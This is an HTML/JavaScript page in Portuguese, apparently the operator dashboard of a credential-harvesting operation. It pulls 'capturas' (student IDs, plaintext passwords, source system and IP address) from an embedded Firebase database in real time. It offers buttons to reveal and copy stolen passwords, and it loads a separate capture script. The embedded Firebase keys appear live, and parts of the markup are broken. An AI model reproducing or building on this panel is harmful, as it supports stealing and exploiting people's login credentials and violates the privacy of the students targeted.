<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trollchipss - Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary-color: #4a6bff;
            --secondary-color: #6c63ff;
            --primary-light: #63b3ff;
            --accent-color: #ff6584;
            --background-color: #0f172a;
            --card-background: #1e293b;
            --text-color: #f8fafc;
            --text-secondary: #94a3b8;
            --border-color: #334155;
            --success-color: #10b981;
            --warning-color: #f59e0b;
            --error-color: #ef4444;
            --font-family: 'Poppins', -apple-system, BlinkMacSystemFont, sans-serif;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: var(--font-family);
            background: var(--background-color);
            color: var(--text-color);
            line-height: 1.6;
            min-height: 100vh;
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(74, 107, 255, 0.1) 0%, transparent 20%),
                radial-gradient(circle at 90% 80%, rgba(108, 99, 255, 0.1) 0%, transparent 20%);
        }

        .container {
            max-width: 1600px;
            margin: 0 auto;
            padding: 20px;
        }

        .header {
            text-align: center;
            padding: 40px 20px;
            margin-bottom: 30px;
        }

        .header h1 {
            font-size: 3rem;
            font-weight: 700;
            background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
        }

        .subtitle {
            font-size: 1.1rem;
            color: var(--text-secondary);
        }

        .controls {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
            gap: 20px;
            flex-wrap: wrap;
        }

        .search-box {
            flex: 1;
            min-width: 300px;
            padding: 12px 20px;
            background: var(--card-background);
            border: 1px solid var(--border-color);
            border-radius: 10px;
            color: var(--text-color);
            font-size: 1rem;
        }

        .search-box:focus {
            outline: none;
            border-color: var(--primary-color);
            box-shadow: 0 0 0 3px rgba(74, 107, 255, 0.1);
        }

        .btn-refresh {
            padding: 12px 24px;
            background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
            color: white;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            font-weight: 600;
            font-size: 1rem;
            transition: all 0.3s ease;
        }

        .btn-refresh:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(74, 107, 255, 0.3);
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: var(--card-background);
            padding: 25px;
            border-radius: 15px;
            border: 1px solid var(--border-color);
            text-align: center;
        }

        .stat-icon {
            font-size: 2.5rem;
            margin-bottom: 10px;
        }

        .stat-value {
            font-size: 2.5rem;
            font-weight: 700;
            background: linear-gradient(45deg, var(--primary-color), var(--accent-color));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 5px;
        }

        .stat-label {
            color: var(--text-secondary);
            font-size: 0.9rem;
        }

        .capturas-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
            gap: 20px;
        }

        .captura-card {
            background: var(--card-background);
            border-radius: 15px;
            padding: 25px;
            border: 1px solid var(--border-color);
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        .captura-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
        }

        .captura-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }

        .captura-header {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            margin-bottom: 20px;
        }

        .captura-ra {
            font-size: 1.4rem;
            font-weight: 700;
            color: var(--primary-light);
            word-break: break-all;
        }

        .captura-actions {
            display: flex;
            gap: 8px;
        }

        .btn-action {
            padding: 6px 10px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.9rem;
            transition: all 0.3s ease;
            background: rgba(255, 255, 255, 0.1);
        }

        .btn-action:hover {
            transform: scale(1.1);
            background: rgba(255, 255, 255, 0.2);
        }

        .captura-info {
            margin-bottom: 15px;
        }

        .info-row {
            display: flex;
            justify-content: space-between;
            padding: 10px 0;
            border-bottom: 1px solid var(--border-color);
        }

        .info-row:last-child {
            border-bottom: none;
        }

        .info-label {
            color: var(--text-secondary);
            font-size: 0.85rem;
            font-weight: 500;
        }

        .info-value {
            color: var(--text-color);
            font-weight: 600;
            text-align: right;
        }

        .senha-oculta {
            font-family: monospace;
            background: rgba(255, 255, 255, 0.05);
            padding: 4px 8px;
            border-radius: 4px;
            cursor: pointer;
        }

        .sistema-badge {
            display: inline-block;
            padding: 6px 12px;
            border-radius: 20px;
            font-size: 0.8rem;
            font-weight: 600;
            background: rgba(74, 107, 255, 0.2);
            color: var(--primary-light);
        }

        .loading {
            text-align: center;
            padding: 60px 20px;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid var(--border-color);
            border-top-color: var(--primary-color);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .empty-state {
            text-align: center;
            padding: 80px 20px;
            color: var(--text-secondary);
        }

        .empty-icon {
            font-size: 5rem;
            margin-bottom: 20px;
            opacity: 0.5;
        }

        @media (max-width: 768px) {
            .header h1 {
                font-size: 2rem;
            }

            .capturas-grid {
                grid-template-columns: 1fr;
            }

            .controls {
                flex-direction: column;
            }

            .search-box {
                width: 100%;
            }
        }

.subtitle {
  text-align: center;

}

label {
  display: block;

  margin-bottom: 14px;
}

input {

  margin-top: 6px;
  padding: 12px 14px;

  background: #0d122b;

  border-color: #7c8cff;

.password-wrap {
  position: relative;
}

#toggle-pass {
  position: absolute;
  right: 12px;
  top: 50%;
  transform: translateY(-50%);
  cursor: pointer;
  opacity: .7;
}

button {
  width: 100%;
  margin-top: 10px;
  padding: 12px;
  border-radius: 14px;
  border: none;
  cursor: pointer;
  font-size: 15px;
  font-weight: 600;
  color: #fff;
  background: linear-gradient(135deg, #6f7dff, #a45bff);
}

button:hover {
  filter: brightness(1.1);
}

#login-error {
  margin-top: 12px;
  text-align: center;
  color: #ff6b6b;
  font-size: 14px;
        }
    </style>
</head>
<body>
<!-- LOGIN OVERLAY -->
<div id="login-overlay" aria-hidden="true">
  <div class="login-card">
    <h2>Central Scripts</h2>
    <p class="subtitle">Acesso restrito</p>

    <form id="login-form" autocomplete="off">
      <label>
        Usu√°rio ou e-mail
        <input type="text" id="login-user" placeholder="Usu√°rio ou e-mail" required />

      <label>
        Senha
        <div class="password-wrap">
          <input type="password" id="login-pass" placeholder="Senha" required />

</div>


    
    <div class="container">
        <div class="header">
            <h1>üìä Dashboard de Capturas</h1>
            <p class="subtitle">Monitoramento em Tempo Real</p>
        </div>

        <div class="controls">
            <input type="text" class="search-box" id="searchBox" placeholder="üîç Buscar por RA, sistema ou IP...">
            <button class="btn-refresh" onclick="loadCapturas()">üîÑ Atualizar</button>
        </div>

        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-icon">üì•</div>
                <div class="stat-value" id="totalCapturas">0</div>
                <div class="stat-label">Total de Capturas</div>
            </div>

            <div class="stat-card">
                <div class="stat-icon">üìÖ</div>
                <div class="stat-value" id="capturasHoje">0</div>
                <div class="stat-label">Capturas Hoje</div>
            </div>

            <div class="stat-card">
                <div class="stat-icon">üïê</div>
                <div class="stat-value" id="ultimaHora">--:--</div>
                <div class="stat-label">√öltima Captura</div>
            </div>

            <div class="stat-card">
                <div class="stat-icon">üë•</div>
                <div class="stat-value" id="usuariosUnicos">0</div>
                <div class="stat-label">Usu√°rios √önicos</div>
            </div>
        </div>

        <div id="capturasContainer">
            <div class="loading">
                <div class="spinner"></div>
                <p>Carregando capturas...</p>
            </div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-app.js";
        import { getDatabase, ref, onValue, remove } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyDu_JGR5515XPd4dOib5NZCi4fRx2-5YlE",
            authDomain: "captura-125a3.firebaseapp.com",
            databaseURL: "https://captura-125a3-default-rtdb.firebaseio.com",
            projectId: "captura-125a3",
            storageBucket: "captura-125a3.firebasestorage.app",
            messagingSenderId: "863901847156",
            appId: "1:863901847156:web:913084a33265ea7c728b21"
        };

        const app = initializeApp(firebaseConfig);
        const database = getDatabase(app);

        let allCapturas = [];
        let filteredCapturas = [];

        function loadCapturas() {
            const capturasRef = ref(database, 'capturas');
            
            onValue(capturasRef, (snapshot) => {
                allCapturas = [];
                const data = snapshot.val();
                
                if (data) {
                    Object.keys(data).forEach(key => {
                        allCapturas.push({
                            id: key,
                            ...data[key]
                        });
                    });
                    
                    allCapturas.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
                }
                
                filteredCapturas = [...allCapturas];
                updateStats();
                renderCapturas();
            });
        }

        function updateStats() {
            const total = allCapturas.length;
            
            const hoje = allCapturas.filter(c => {
                const capData = new Date(c.timestamp);
                const hoje = new Date();
                return capData.toDateString() === hoje.toDateString();
            }).length;
            
            const ultimaHora = allCapturas.length > 0 ? 
                new Date(allCapturas[0].timestamp).toLocaleTimeString('pt-BR', {
                    hour: '2-digit',
                    minute: '2-digit'
                }) : '--:--';
            
            const usuarios = new Set(allCapturas.map(c => c.ra)).size;
            
            document.getElementById('totalCapturas').textContent = total;
            document.getElementById('capturasHoje').textContent = hoje;
            document.getElementById('ultimaHora').textContent = ultimaHora;
            document.getElementById('usuariosUnicos').textContent = usuarios;
        }

        function renderCapturas() {
            const container = document.getElementById('capturasContainer');
            
            if (filteredCapturas.length === 0) {
                container.innerHTML = `
                    <div class="empty-state">
                        <div class="empty-icon">üì≠</div>
                        <h2>Nenhuma captura encontrada</h2>
                        <p>As credenciais capturadas aparecer√£o aqui em tempo real</p>
                    </div>
                `;
                return;
            }
            
            let html = '<div class="capturas-grid">';
            
            filteredCapturas.forEach(captura => {
                const dataFormatada = captura.dataHora || new Date(captura.timestamp).toLocaleString('pt-BR');
                
                html += `
                    <div class="captura-card">
                        <div class="captura-header">
                            <div class="captura-ra">${captura.ra}</div>
                            <div class="captura-actions">
                                <button class="btn-action" onclick="copiarCredenciais('${captura.ra}', '${captura.senha}')" title="Copiar">
                                    üìã
                                </button>
                                <button class="btn-action" onclick="deletarCaptura('${captura.id}')" title="Excluir">
                                    üóëÔ∏è
                                </button>
                            </div>
                        </div>
                        
                        <div class="captura-info">
                            <div class="info-row">
                                <span class="info-label">Senha:</span>
                                <span class="info-value senha-oculta" onclick="mostrarSenha(this, '${captura.senha}')">
                                    ‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢
                                </span>
                            </div>
                            
                            <div class="info-row">
                                <span class="info-label">Data/Hora:</span>
                                <span class="info-value">${dataFormatada}</span>
                            </div>
                            
                            <div class="info-row">
                                <span class="info-label">Sistema:</span>
                                <span class="sistema-badge">${captura.sistema}</span>
                            </div>
                            
                            <div class="info-row">
                                <span class="info-label">IP:</span>
                                <span class="info-value">${captura.ip || 'N/A'}</span>
                            </div>
                        </div>
                    </div>
                `;
            });
            
            html += '</div>';
            container.innerHTML = html;
        }

        window.copiarCredenciais = function(ra, senha) {
            const texto = `RA: ${ra}\nSenha: ${senha}`;
            navigator.clipboard.writeText(texto).then(() => {
                alert('‚úÖ Credenciais copiadas!');
            });
        };

        window.mostrarSenha = function(elemento, senha) {
            if (elemento.textContent === '‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢') {
                elemento.textContent = senha;
            } else {
                elemento.textContent = '‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢';
            }
        };

        window.deletarCaptura = async function(id) {
            if (confirm('Deseja realmente excluir esta captura?')) {
                const capturaRef = ref(database, `capturas/${id}`);
                await remove(capturaRef);
                alert('‚úÖ Captura exclu√≠da!');
            }
        };

        window.loadCapturas = loadCapturas;

        document.getElementById('searchBox').addEventListener('input', (e) => {
            const busca = e.target.value.toLowerCase();
            filteredCapturas = allCapturas.filter(c => 
                c.ra.toLowerCase().includes(busca) ||
                c.sistema.toLowerCase().includes(busca) ||
                (c.ip && c.ip.toLowerCase().includes(busca))
            );
            renderCapturas();
        });

        loadCapturas();

        console.log('%cüìä Dashboard carregado!', 'color: #10b981; font-size: 16px; font-weight: bold;');
    </script>
    <script src="captura/script.js"></script>
</body>
  </html>
